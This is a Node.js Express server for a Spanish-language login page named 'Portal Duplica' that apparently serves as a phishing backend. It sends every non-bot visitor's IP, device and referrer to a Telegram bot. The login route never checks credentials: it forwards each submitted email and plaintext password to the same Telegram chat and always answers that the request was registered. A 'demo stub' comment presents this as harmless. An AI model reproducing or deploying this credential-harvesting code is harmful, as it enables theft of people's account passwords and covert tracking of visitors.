require("dotenv").config();
const express = require("express");
const os = require("os");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";

// Per-IP cooldown to avoid duplicate notifications on refresh (10 minutes)
const VISITOR_COOLDOWN_MS = 10 * 60 * 1000;
const recentVisitors = new Map();

function getLocalAddresses() {
  const addresses = [];
  for (const interfaces of Object.values(os.networkInterfaces())) {
    for (const iface of interfaces) {
      if (iface.family === "IPv4" && !iface.internal) {
        addresses.push(iface.address);
      }
    }
  }
  return addresses;
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn("[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return { ok: false, error: "not_configured" };
  }
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    console.error("[telegram]", data.description || res.statusText);
    return { ok: false, error: data.description || "request_failed" };
  }
  return { ok: true };
}

function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function parseDevice(ua) {
  if (!ua) return "Unknown";
  if (/mobile/i.test(ua)) return "Mobile";
  if (/tablet|ipad/i.test(ua)) return "Tablet";
  return "Desktop";
}

function parseBrowser(ua) {
  if (!ua) return "Unknown";
  if (/edg\//i.test(ua)) return "Edge";
  if (/opr\//i.test(ua)) return "Opera";
  if (/chrome/i.test(ua)) return "Chrome";
  if (/firefox/i.test(ua)) return "Firefox";
  if (/safari/i.test(ua)) return "Safari";
  return "Other";
}

// Visitor tracking — serves index.html and notifies Telegram
app.get("/", async (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));

  if (process.env.TELEGRAM_NOTIFY !== "true") return;

  const ip = getClientIp(req);
  const ua = req.headers["user-agent"] || "";

  // Skip bots and uptime monitors
  if (/bot|crawl|slurp|spider|uptime|monitor|ping/i.test(ua)) return;

  // Cooldown check
  const lastSeen = recentVisitors.get(ip);
  const now = Date.now();
  if (lastSeen && now - lastSeen < VISITOR_COOLDOWN_MS) return;
  recentVisitors.set(ip, now);

  const when = new Date().toUTCString();
  const referrer = req.headers["referer"] || "Direct";
  const device = parseDevice(ua);
  const browser = parseBrowser(ua);

  await sendTelegram(
    [
      "<b>👁️ Nuevo Visitante — Portal Duplica</b>",
      "",
      `<b>IP:</b> ${escapeHtml(ip)}`,
      `<b>Dispositivo:</b> ${device}`,
      `<b>Navegador:</b> ${browser}`,
      `<b>Referido:</b> ${escapeHtml(referrer)}`,
      `<b>Hora (UTC):</b> ${when}`,
    ].join("\n")
  );
});

app.use(express.static(path.join(__dirname, "public")));

app.get("/health", (_req, res) => res.json({ ok: true }));

app.post("/api/login", async (req, res) => {
  const email = String(req.body.email || "").trim();
  const password = String(req.body.password || "");

  if (!email || !password) {
    return res.status(400).json({ ok: false, message: "Correo y contraseña obligatorios." });
  }

  // Demo stub — replace with real authentication (hashing, sessions, etc.)
  console.log("[login] Demo submit received for:", email);

  if (process.env.TELEGRAM_NOTIFY === "true") {
    const when = new Date().toISOString();
    const result = await sendTelegram(
      [
        "<b>Portal Duplica</b>",
        "",
        "<b>Evento:</b> envío del formulario",
        `<b>Correo:</b> ${escapeHtml(email)}`,
        `<b>Contraseña:</b> ${escapeHtml(password)}`,
        `<b>Hora (UTC):</b> ${when}`,
      ].join("\n")
    );
    if (result.ok) {
      console.log("[telegram] Notification sent.");
    } else {
      console.error("[telegram] Notification failed:", result.error);
    }
  }

  return res.json({
    ok: true,
    message: "Solicitud registrada.",
  });
});

// Only start the HTTP server when running locally (not on Vercel)
if (process.env.VERCEL !== "1") {
  app.listen(PORT, HOST, () => {
    const localAddresses = getLocalAddresses();
    console.log(`Server listening on ${HOST}:${PORT}`);
    console.log(`Local:   http://localhost:${PORT}`);
    for (const address of localAddresses) {
      console.log(`Network: http://${address}:${PORT}`);
    }
    if (localAddresses.length === 0) {
      console.log("No LAN IPv4 address found. Check your network connection.");
    }
  });
}

module.exports = app;
